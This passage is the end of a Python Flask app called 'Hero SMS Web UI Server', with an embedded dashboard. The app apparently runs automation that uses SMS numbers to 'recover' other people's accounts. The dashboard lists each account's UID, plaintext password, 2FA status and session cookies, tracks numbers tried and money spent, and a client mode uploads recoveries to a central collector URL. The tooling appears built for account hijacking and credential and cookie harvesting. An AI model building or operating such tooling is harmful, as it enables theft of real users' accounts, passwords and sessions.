                    sessionStats.tried = line.split(': ')[1] || '0';
                } else if (line.includes('Total Amount Spent')) {
                    sessionStats.spent = line.split(': ')[1] || '$0.00';
                }
                
                // If the script finished, reload accounts table
                if (line.includes('[SYSTEM_FINISH]')) {
                    loadAccounts();
                    loadStats();
                    // Show summary if we tried numbers in this session
                    if (parseInt(sessionStats.tried) > 0 || parseInt(sessionStats.recovered) > 0) {
                        setTimeout(showSummaryModal, 1000);
                    }
                }
            };
            
            eventSource.onerror = () => {
                eventSource.close();
                eventSource = null;
            };
        }

        let selectedDateFilter = null;
        let accountsData = [];

        function loadAccounts() {
            fetch('/api/accounts')
                .then(res => res.json())
                .then(data => {
                    accountsData = data;
                    renderAccounts();
                    populateSessionDropdown();
                });
        }

        function populateSessionDropdown() {
            const sel = document.getElementById('session-select');
            if (!sel) return;
            const cur = sel.value;
            const dates = [...new Set(accountsData.map(a => (a.date || '').slice(0, 10)).filter(Boolean))].sort().reverse();
            sel.innerHTML = '<option value="">All sessions</option>' + dates.map(d => '<option value="' + d + '">' + d + '</option>').join('');
            if (dates.includes(cur)) sel.value = cur;
            else if (selectedDateFilter && dates.includes(selectedDateFilter)) sel.value = selectedDateFilter;
        }

        function onSessionSelect() {
            const v = document.getElementById('session-select').value;
            selectedDateFilter = v || null;
            renderAccounts();
        }

        function downloadAccounts() {
            if (!accountsData.length) { showToast('No recovered accounts to download yet.', 'danger'); return; }
            const d = document.getElementById('session-select').value || '';
            const url = '/api/download_accounts' + (d ? ('?date=' + encodeURIComponent(d)) : '');
            const a = document.createElement('a');
            a.href = url;
            document.body.appendChild(a);
            a.click();
            a.remove();
        }

        function renderAccounts() {
            const tbody = document.getElementById('accounts-tbody');
            const badge = document.getElementById('filter-badge');
            const badgeText = document.getElementById('filter-date-text');
            
            if (selectedDateFilter) {
                let dateDisplay = selectedDateFilter;
                try {
                    const parsedDate = new Date(selectedDateFilter + 'T00:00:00');
                    dateDisplay = parsedDate.toLocaleDateString(undefined, { month: 'short', day: 'numeric' });
                } catch (e) {}
                badgeText.textContent = dateDisplay;
                badge.style.display = 'inline-flex';
            } else {
                badge.style.display = 'none';
            }

            let filtered = accountsData;
            if (selectedDateFilter) {
                filtered = accountsData.filter(acc => acc.date && acc.date.startsWith(selectedDateFilter));
            }

            if (filtered.length === 0) {
                tbody.innerHTML = `
                    <tr>
                        <td colspan="7" style="text-align: center; color: var(--text-muted); padding: 2rem;">
                            ${selectedDateFilter ? 'No recovered accounts found for this day.' : 'No recovered accounts found yet. Running automation successfully will add items here.'}
                        </td>
                    </tr>`;
                return;
            }
            
            tbody.innerHTML = '';
            const displayData = filtered;
            displayData.forEach((acc, index) => {
                const tr = document.createElement('tr');
                
                // Number column ('No')
                const tdNo = document.createElement('td');
                tdNo.textContent = index + 1;
                tdNo.style.color = 'var(--text-muted)';
                tdNo.style.fontWeight = '600';
                tr.appendChild(tdNo);
                
                const parts = acc.date.split(' ');
                const dateStr = parts[0];
                const timeStr = parts[1];
                
                const today = new Date();
                const todayStr = today.getFullYear() + '-' + 
                                 String(today.getMonth() + 1).padStart(2, '0') + '-' + 
                                 String(today.getDate()).padStart(2, '0');
                
                const isToday = (dateStr === todayStr);
                
                let ampmTime = timeStr;
                if (timeStr) {
                    const tParts = timeStr.split(':');
                    if (tParts.length >= 2) {
                        let hour = parseInt(tParts[0]);
                        const min = tParts[1];
                        const sec = tParts[2] || '00';
                        const ampm = hour >= 12 ? 'PM' : 'AM';
                        hour = hour % 12;
                        hour = hour ? hour : 12;
                        ampmTime = `${String(hour).padStart(2, '0')}:${min}:${sec} ${ampm}`;
                    }
                }
                
                const tdTime = document.createElement('td');
                if (isToday) {
                    tr.style.background = 'rgba(16, 185, 129, 0.04)';
                    tdTime.innerHTML = `
                         <div style="display: flex; align-items: center; gap: 0.5rem;">
                             <span style="display: inline-block; width: 6px; height: 6px; background: #10b981; border-radius: 50%; animation: dot-pulse 1.8s infinite;"></span>
                             <span style="color: #10b981; font-weight: 600;">Today, ${ampmTime}</span>
                         </div>`;
                } else {
                    tdTime.innerHTML = `<span style="color: var(--text-muted);">${dateStr} ${ampmTime}</span>`;
                }
                tr.appendChild(tdTime);
                
                const tdProfile = document.createElement('td');
                tdProfile.textContent = acc.profile || 'Unknown';
                tdProfile.style.fontWeight = '500';
                if (isToday) {
                    tdProfile.style.color = '#e0e0e0';
                }
                tr.appendChild(tdProfile);
                
                const tdUid = document.createElement('td');
                tdUid.style.fontWeight = '500';
                tdUid.textContent = acc.uid;
                tr.appendChild(tdUid);
                
                const tdPass = document.createElement('td');
                tdPass.style.fontFamily = 'var(--font-mono)';
                tdPass.textContent = acc.password;
                tr.appendChild(tdPass);
                
                const td2fa = document.createElement('td');
                if (acc.two_fa && acc.two_fa.trim() === '2FA') {
                    td2fa.innerHTML = `<span style="background: rgba(245, 158, 11, 0.15); color: #f59e0b; padding: 0.15rem 0.4rem; border-radius: 4px; font-weight: 600; font-size: 0.75rem;">2FA</span>`;
                } else {
                    td2fa.innerHTML = `<span style="color: var(--text-muted); font-size: 0.85rem;">None</span>`;
                }
                tr.appendChild(td2fa);
                
                const tdActions = document.createElement('td');
                const copyBtn = document.createElement('button');
                copyBtn.className = 'copy-btn';
                copyBtn.innerHTML = `
                    <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
                    </svg>
                    Copy Cookies`;
                copyBtn.onclick = () => {
                    navigator.clipboard.writeText(acc.cookie).then(() => {
                        showToast('Cookies copied to clipboard!');
                    });
                };
                tdActions.appendChild(copyBtn);
                tr.appendChild(tdActions);
                
                tbody.appendChild(tr);
            });
        }

        function clearDateFilter(event) {
            if (event) event.stopPropagation();
            selectedDateFilter = null;
            loadStats();
            renderAccounts();
        }

        function toggleDateFilter(date) {
            if (selectedDateFilter === date) {
                selectedDateFilter = null;
            } else {
                selectedDateFilter = date;
            }
            loadStats();
            renderAccounts();
        }

        function clearAccounts() {
            if (confirm('Are you sure you want to clear the recovered accounts history?')) {
                fetch('/api/clear_accounts', { method: 'POST' })
                    .then(res => res.json())
                    .then(data => {
                        if (data.status === 'success') {
                            showToast('Accounts history cleared.', 'danger');
                            loadAccounts();
                        }
                    });
            }
        }

        let sessionStats = {
            duration: '0m 0s',
            recovered: '0',
            tried: '0',
            spent: '$0.00'
        };

        function showSummaryModal() {
            document.getElementById('modal-duration').textContent = sessionStats.duration;
            document.getElementById('modal-recovered').textContent = sessionStats.recovered;
            document.getElementById('modal-tried').textContent = sessionStats.tried;
            document.getElementById('modal-spent').textContent = sessionStats.spent;
            
            const modal = document.getElementById('summary-modal');
            modal.style.display = 'flex';
            // Force reflow
            modal.offsetHeight;
            modal.style.opacity = '1';
        }

        function closeSummaryModal() {
            const modal = document.getElementById('summary-modal');
            modal.style.opacity = '0';
            setTimeout(() => {
                modal.style.display = 'none';
            }, 300);
        }

        function loadStats() {
            fetch('/api/stats')
                .then(res => res.json())
                .then(data => {
                    const grid = document.getElementById('stats-grid');
                    const dates = Object.keys(data).sort().reverse(); // Show newest dates first
                    
                    if (dates.length === 0) {
                        grid.innerHTML = '<div style="text-align: center; color: var(--text-muted); padding: 2rem; grid-column: 1 / -1;">No daily history recorded yet. Runs will show up here.</div>';
                        return;
                    }
                    
                    const localDate = new Date();
                    const year = localDate.getFullYear();
                    const month = String(localDate.getMonth() + 1).padStart(2, '0');
                    const day = String(localDate.getDate()).padStart(2, '0');
                    const todayStr = `${year}-${month}-${day}`;
                    
                    grid.innerHTML = '';
                    
                    // Filter dates to only include the last 30 days (recent month)
                    const thirtyDaysAgo = new Date();
                    thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);
                    
                    const recentMonthDates = dates.filter(date => {
                        try {
                            const parsedDate = new Date(date + 'T00:00:00');
                            return parsedDate >= thirtyDaysAgo;
                        } catch (e) {
                            return false;
                        }
                    });
                    
                    if (recentMonthDates.length === 0) {
                        grid.innerHTML = '<div style="text-align: center; color: var(--text-muted); padding: 2rem; grid-column: 1 / -1;">No history recorded within the last 30 days.</div>';
                        return;
                    }
                    
                    // Calculate active running duration portion spent TODAY
                    let activeToday = 0;
                    if (window.activeStartTime) {
                        const midnight = new Date();
                        midnight.setHours(0, 0, 0, 0);
                        const midnightEpoch = Math.floor(midnight.getTime() / 1000);
                        
                        const activeStart = window.activeStartTime;
                        const activeEnd = Math.floor(Date.now() / 1000);
                        const dayStart = Math.max(activeStart, midnightEpoch);
                        activeToday = Math.floor(Math.max(0, activeEnd - dayStart));
                    }

                    recentMonthDates.forEach(date => {
                        const dayStats = data[date];
                        const count = dayStats.recovered;
                        const spent = parseFloat(dayStats.spent || 0).toFixed(2);
                        const failedLogins = parseInt(dayStats.failed_logins || 0);
                        
                        // Format duration with readable units (hr, min, sec) and pluralization
                        let durationSec = parseInt(dayStats.duration || 0);
                        if (date === todayStr && activeToday) {
                            durationSec += activeToday;
                        }
                        
                        let durationDisplay = '0s';
                        let avgDisplay = '0s';
                        if (durationSec > 0) {
                            const hours = Math.floor(durationSec / 3600);
                            const minutes = Math.floor((durationSec % 3600) / 60);
                            const seconds = durationSec % 60;
                            
                            let parts = [];
                            if (hours > 0) {
                                parts.push(`${hours}h`);
                            }
                            if (minutes > 0) {
                                parts.push(`${minutes}m`);
                            }
                            if (seconds > 0 || parts.length === 0) {
                                parts.push(`${seconds}s`);
                            }
                            durationDisplay = parts.join(' ');
                            
                            // Calculate average time per account using success_duration
                            if (count > 0) {
                                let successSec = parseInt(dayStats.success_duration || 0);
                                if (date === todayStr && activeToday && window.activeSessionRecovered > 0) {
                                    successSec += activeToday;
                                }
                                let avgSec = 0;
                                if (successSec > 0) {
                                    avgSec = Math.round(successSec / count);
                                } else {
                                    avgSec = Math.round(durationSec / count);
                                }
                                const avgHours = Math.floor(avgSec / 3600);
                                const avgMin = Math.floor((avgSec % 3600) / 60);
                                const avgRemainingSec = avgSec % 60;
                                
                                let avgParts = [];
                                if (avgHours > 0) {
                                    avgParts.push(`${avgHours}h`);
                                }
                                if (avgMin > 0) {
                                    avgParts.push(`${avgMin}m`);
                                }
                                if (avgRemainingSec > 0 || avgParts.length === 0) {
                                    avgParts.push(`${avgRemainingSec}s`);
                                }
                                avgDisplay = avgParts.join(' ');
                            }
                        }
                        
                        let dateDisplay = date;
                        try {
                            const parsedDate = new Date(date + 'T00:00:00');
                            dateDisplay = parsedDate.toLocaleDateString(undefined, { month: 'short', day: 'numeric' });
                        } catch (e) {}
                        
                        const card = document.createElement('div');
                        card.style.cursor = 'pointer';
                        card.style.transition = 'all 0.2s ease-in-out';
                        card.style.borderRadius = '10px';
                        card.style.padding = '1rem 0.85rem';
                        card.style.display = 'flex';
                        card.style.flexDirection = 'column';
                        card.style.alignItems = 'center';
                        card.style.gap = '0.5rem';
                        card.style.minWidth = '155px';
                        
                        if (selectedDateFilter === date) {
                            card.style.background = 'rgba(99, 102, 241, 0.12)';
                            card.style.border = '1px solid var(--primary-color)';
                            card.style.boxShadow = '0 0 12px rgba(99, 102, 241, 0.25)';
                        } else {
                            card.style.background = 'rgba(255, 255, 255, 0.03)';
                            card.style.border = '1px solid var(--border-color)';
                            card.style.boxShadow = 'none';
                        }

                        card.onmouseenter = () => {
                            if (selectedDateFilter !== date) {
                                card.style.background = 'rgba(255, 255, 255, 0.06)';
                                card.style.borderColor = 'rgba(255, 255, 255, 0.2)';
                            }
                        };
                        card.onmouseleave = () => {
                            if (selectedDateFilter !== date) {
                                card.style.background = 'rgba(255, 255, 255, 0.03)';
                                card.style.borderColor = 'var(--border-color)';
                            }
                        };

                        card.onclick = () => {
                            toggleDateFilter(date);
                        };
                        
                        card.innerHTML = `
                            <span style="font-size: 0.85rem; color: #e2e8f0; font-weight: 600;">${dateDisplay}</span>
                            <span style="font-size: 1.6rem; font-weight: 800; color: var(--success-color); margin: 0.1rem 0;">${count}</span>
                            <span style="font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-muted); font-weight: 600;">Recovered</span>
                            <div style="width: 100%; border-top: 1px solid rgba(255,255,255,0.05); margin-top: 0.4rem; padding-top: 0.4rem; display: flex; flex-direction: column; gap: 0.2rem; font-size: 0.75rem; text-align: left; align-self: flex-start;">
                                <div style="display: flex; justify-content: space-between; color: var(--text-muted);">
                                    <span>Spent:</span>
                                    <span style="color: #f59e0b; font-weight: 600;">$${spent}</span>
                                </div>
                                <div style="display: flex; justify-content: space-between; color: var(--text-muted);">
                                    <span>Failed Logins:</span>
                                    <span style="color: #ef4444; font-weight: 600;">${failedLogins}</span>
                                </div>
                                <div style="display: flex; justify-content: space-between; color: var(--text-muted);">
                                    <span>Time:</span>
                                    <span style="color: #38bdf8; font-weight: 500; font-size: 0.72rem;">${durationDisplay}</span>
                                </div>
                                <div style="display: flex; justify-content: space-between; color: var(--text-muted);">
                                    <span>Avg/Acct:</span>
                                    <span style="color: #10b981; font-weight: 600;">${avgDisplay}</span>
                                </div>
                                
                            </div>
                        `;
                        
                        grid.appendChild(card);
                    });
                });
        }
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    # Client edition: start the background uploader / remote-disable check-in
    if IS_CLIENT:
        threading.Thread(target=client_uploader_loop, daemon=True).start()
        print(f"[CLIENT EDITION] '{CLIENT_ID}' -> uploading recoveries to {COLLECTOR_URL}")

    # ---- Host/port resolution ----
    # Port:  CLI arg 1  ->  env HERO_PORT  ->  5000
    # Host:  env HERO_HOST  ->  127.0.0.1 (local only)
    #        Set HERO_HOST=0.0.0.0 to accept connections from other machines
    #        (central-server mode). Do that ONLY behind HTTPS + a firewall.
    port = 5000
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            pass
    else:
        try:
            port = int(os.environ.get("HERO_PORT", "5000"))
        except ValueError:
            port = 5000

    host = os.environ.get("HERO_HOST", "127.0.0.1").strip() or "127.0.0.1"
    exposed = host not in ("127.0.0.1", "localhost")

    print("==================================================")
    print(" Hero SMS Web UI Server")
    print(f" Binding: {host}:{port}")
    if exposed:
        print(f" Reachable on your network at: http://<this-server-ip>:{port}")
        if os.environ.get("HERO_HTTPS", "").lower() not in ("1", "true", "yes"):
            print(" [!] WARNING: exposed without HTTPS. Logins are sent in the clear.")
            print("     Put this behind an HTTPS reverse proxy (Caddy/nginx) and")
            print("     set HERO_HTTPS=1, or restrict access with a firewall/VPN.")
    else:
        print(f" Local only: http://127.0.0.1:{port}")
    print(" Default login: admin / admin  (change it after first sign-in)")
    print("==================================================")

    # Prefer a production WSGI server (waitress) so it can handle multiple
    # simultaneous users. Fall back to Flask's dev server if not installed.
    try:
        from waitress import serve
        serve(app, host=host, port=port, threads=8)
    except ImportError:
        print(" [i] 'waitress' not installed - using Flask's built-in dev server.")
        print("     For a shared server run: pip install waitress")
        app.run(host=host, port=port, debug=False, threaded=True)
